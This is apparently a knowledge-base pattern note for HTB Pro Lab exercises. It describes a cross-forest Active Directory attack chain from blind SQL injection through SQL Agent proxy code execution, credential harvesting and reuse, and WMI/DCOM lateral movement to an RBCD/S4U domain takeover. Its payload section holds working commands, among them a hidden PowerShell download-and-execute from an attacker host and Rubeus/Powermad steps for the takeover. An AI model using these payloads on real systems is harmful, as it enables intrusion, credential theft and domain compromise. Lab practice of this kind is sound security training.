---
doc_kind: pattern
title: "Cross-Forest AD Pro Lab Escalation: SQLAgent Proxy RCE to Cred Reuse to RBCD/S4U"
category: misc
slug: ad-cross-forest-sqlagent-rbcd-s4u-chain
created: 2026-10-25
status: active
tags:
  - active-directory
  - rbcd
  - s4u2self
  - s4u2proxy
  - sqlagent
  - dcsync
  - cross-forest-trust
  - wmi-dcom
  - dpapi
chain_summary: "Typical HTB Pro Lab cross-forest chain: blind SQLi -> EXECUTE AS impersonation -> SQL Server Agent job with a non-default @proxy_id for RCE under a service account -> harvest DPAPI/credential-store secrets -> reuse creds across a FOREST_TRANSITIVE trust -> when SMB/445 is filtered use WMI over DCOM (port 135) -> abuse ms-DS-MachineAccountQuota to create a machine account and set RBCD on a far-forest DC -> Rubeus asktgt (even if interactive logon is denied) + s4u2self/s4u2proxy -> DA on the second forest."
---
# Cross-Forest AD Pro Lab Escalation: SQLAgent Proxy RCE to Cred Reuse to RBCD/S4U

## Chain Summary

- One-line chain: Typical HTB Pro Lab cross-forest chain: blind SQLi -> EXECUTE AS impersonation -> SQL Server Agent job with a non-default @proxy_id for RCE under a service account -> harvest DPAPI/credential-store secrets -> reuse creds across a FOREST_TRANSITIVE trust -> when SMB/445 is filtered use WMI over DCOM (port 135) -> abuse ms-DS-MachineAccountQuota to create a machine account and set RBCD on a far-forest DC -> Rubeus asktgt (even if interactive logon is denied) + s4u2self/s4u2proxy -> DA on the second forest.
- Typical target shape: HTB-style Pro Lab / Endgame with a single internet-reachable web+MSSQL host as entry point, a first AD domain/forest reachable from there, and a second (child or cross-forest-trusted) domain reachable only by pivoting through the first domain controller — repeatedly observed across the "Offshore" and "Ascension" Pro Labs.

## Preconditions

- An internet-facing web app backed by MSSQL with at least a blind SQL injection point (no need for an error-based or stacked-query-friendly injection — a UNION read plus stacked-query write into a self-made exfil "mailbox" table is enough).
- The web app's SQL login can `EXECUTE AS LOGIN` to impersonate a more privileged login that holds `SQLAgentUserRole`/`SQLAgentOperatorRole` (short of full `sysadmin`).
- At least one SQL Server Agent **proxy** is configured (`msdb.dbo.sp_help_proxy` returns a row) — proxies let a job step run as a real OS credential instead of `NT SERVICE\SQLSERVERAGENT`.
- A domain controller or management host reachable from the web host holds harvestable local secrets (DPAPI master keys, credential vaults) for a higher-privileged domain account.
- A `FOREST_TRANSITIVE` (or child/parent) AD trust exists to a second domain/forest, and at least one account's password is reused across both sides of that trust.
- The far-forest/domain has `ms-DS-MachineAccountQuota > 0` (the AD default is 10) allowing any authenticated user to create a machine account, and SMB/445 may be filtered on intermediate hosts (requiring an RPC/135-based WMI/DCOM pivot instead).

## Cheap Probes

- `SELECT SUSER_SNAME(), HOST_NAME(), @@SERVERNAME` plus `sys.database_permissions WHERE permission_name='IMPERSONATE'` to find an impersonable higher-privileged login.
- `EXEC msdb.dbo.sp_help_proxy` to list configured SQLAgent proxies and their bound credentials.
- `Get-ADTrust -Filter *` (PowerView/AD module) from any domain-joined foothold to enumerate trust relationships and their type (`FOREST_TRANSITIVE` is the one worth pursuing for cross-forest cred reuse/delegation).
- `nmap -p 445,135` against a newly reached host — if 445 is filtered but 135 is open, plan for `New-CimSession -Protocol Dcom` instead of SMB-based tooling (PsExec/`schtasks /s`/`C$`).
- Check `ms-DS-MachineAccountQuota` on the target domain (`Get-ADDomain | select-object -expandproperty ms-DS-MachineAccountQuota` or an LDAP query) before planning an RBCD chain.

## Telltale Evidence

- A SQLAgent proxy existing at all (`proxy_id` present) is the single detail that turns impersonation into RCE — without it, a job just runs harmlessly as `NT SERVICE\SQLSERVERAGENT`.
- An account's interactive logon being denied (Windows error 2240, "not allowed to log on from this workstation") does **not** mean Kerberos TGT issuance is blocked — this gap is exactly what an S4U/RBCD chain needs, since only a TGT (not interactive logon rights) is required.
- SMB filtered but RPC/135 open on a Windows host is a specific, recognizable signal to pivot via WMI/DCOM rather than treating the host as unreachable.

## Escalation Order

1. Blind SQLi → build a self-made exfil table (`INSERT`+`UNION` re-read) if the app's own response doesn't surface injection output directly.
2. Enumerate `EXECUTE AS`/impersonation rights and SQLAgent proxies; if a proxy exists, create+run a `CmdExec` job step bound to `@proxy_id=<n>` to get RCE as that proxy's OS credential.
3. From that foothold, harvest local secrets (DPAPI master keys/credential vaults, SAM, LSA secrets) for a higher-privileged domain account.
4. Pivot to the first domain controller with the harvested credential; from there, discover the second domain/forest (routing, `Get-ADTrust`) and test credential reuse across the trust boundary.
5. When moving laterally and SMB/445 is filtered, use WMI over DCOM (`New-CimSession -Protocol Dcom` + `Invoke-CimMethod ... Win32_Process Create`) for command execution, and exfiltrate output through any webroot the target already serves over HTTP (rather than forcing an SMB tunnel).
6. On the far side of the trust, obtain a TGT for any available account even if interactive logon is blocked (`Rubeus.exe asktgt`); create a machine account (Powermad `New-MachineAccount`) if the quota allows; write that machine account's SID into the target DC's own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (RBCD).
7. Request a service ticket for the target DC's service (e.g. `CIFS`) impersonating `administrator` via S4U2Self + S4U2Proxy, using the machine account's **hash** (`/rc4` or `/aes256` — not its plaintext password, which the S4U step rejects).
8. Access the target DC's admin share (`C$`) or desired service with the resulting ticket.

## Common Mistakes

- Giving up on a lateral-movement target because SMB/445 is filtered, instead of checking for RPC/135 and using WMI/DCOM.
- Assuming an account that can't log on interactively (error 2240) is a dead end, instead of still requesting a Kerberos TGT for it.
- Passing a machine account's plaintext password (instead of its RC4/AES hash) to the S4U2Self step — it is rejected.
- Writing AD attributes (RBCD) or creating machine accounts while binding to a domain controller by IP address rather than FQDN — this can degrade authentication to NTLM and fail across a WinRM double-hop, or cause SPN/credential mismatches.
- Reading sensitive values (flags, secrets) via a normalizing method (`Get-Content`, `type`) instead of a byte-exact read (`[BitConverter]::ToString([IO.File]::ReadAllBytes(path))`) when a platform validates exact casing/whitespace.

## Payload Shapes

```sql
-- SQLAgent proxy RCE
USE msdb; EXECUTE AS LOGIN='<impersonable_login>';
EXEC msdb.dbo.sp_add_job @job_name=N'x';
EXEC msdb.dbo.sp_add_jobstep @job_name=N'x', @step_name=N's1', @subsystem=N'CmdExec',
  @command=N'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker>/s.ps1'')"',
  @proxy_id=<n>;
EXEC msdb.dbo.sp_add_jobserver @job_name=N'x';
EXEC msdb.dbo.sp_start_job @job_name=N'x';
REVERT;
```

```powershell
# WMI/DCOM lateral movement when SMB is filtered
$s = New-CimSession -ComputerName <target> -Credential $cred -SessionOption (New-CimSessionOption -Protocol Dcom)
Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = '<cmd>' }
```

```powershell
# RBCD + S4U to a far-forest DC after a blocked-interactive-logon TGT
Rubeus.exe asktgt /domain:<far_forest> /dc:<far_dc_fqdn> /user:<svc> /password:<pw> /ptt /nowrap
New-MachineAccount -MachineAccount Evil -Password (ConvertTo-SecureString '...' -AsPlainText -Force) -Domain <far_forest> -DomainController <far_dc_fqdn>
# ... write msDS-AllowedToActOnBehalfOfOtherIdentity on the target DC's computer object ...
Rubeus.exe hash /user:'Evil$' /password:'...' /domain:<far_forest>
Rubeus.exe s4u /domain:<far_forest> /dc:<far_dc_fqdn> /user:'Evil$' /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/<far_dc_fqdn> /altservice:cifs /ptt /nowrap
```

## Related Writeups

- `knowledge/writeups/misc/htb-offshore-prolab-cross-forest-ad.md`
- `knowledge/writeups/misc/htb-ascension-prolab-sqli-rbcd-cross-forest.md`

## Skill Impact

- Related skill: a dedicated AD/Pro Lab triage skill does not yet exist in this repo (current skills cover web/pwn/rev triage) — consider proposing one via `skill-maintainer` if a third independent AD Pro Lab chain reinforces this pattern.
- Rule to add or update: when enumerating a SQL Server reachable via a web app, always check `sp_help_proxy` for configured proxies before concluding that `EXECUTE AS`/SQLAgent access caps out at a useless job; when SMB is filtered on a lateral target, default to WMI/DCOM over SMB-tunneling workarounds.
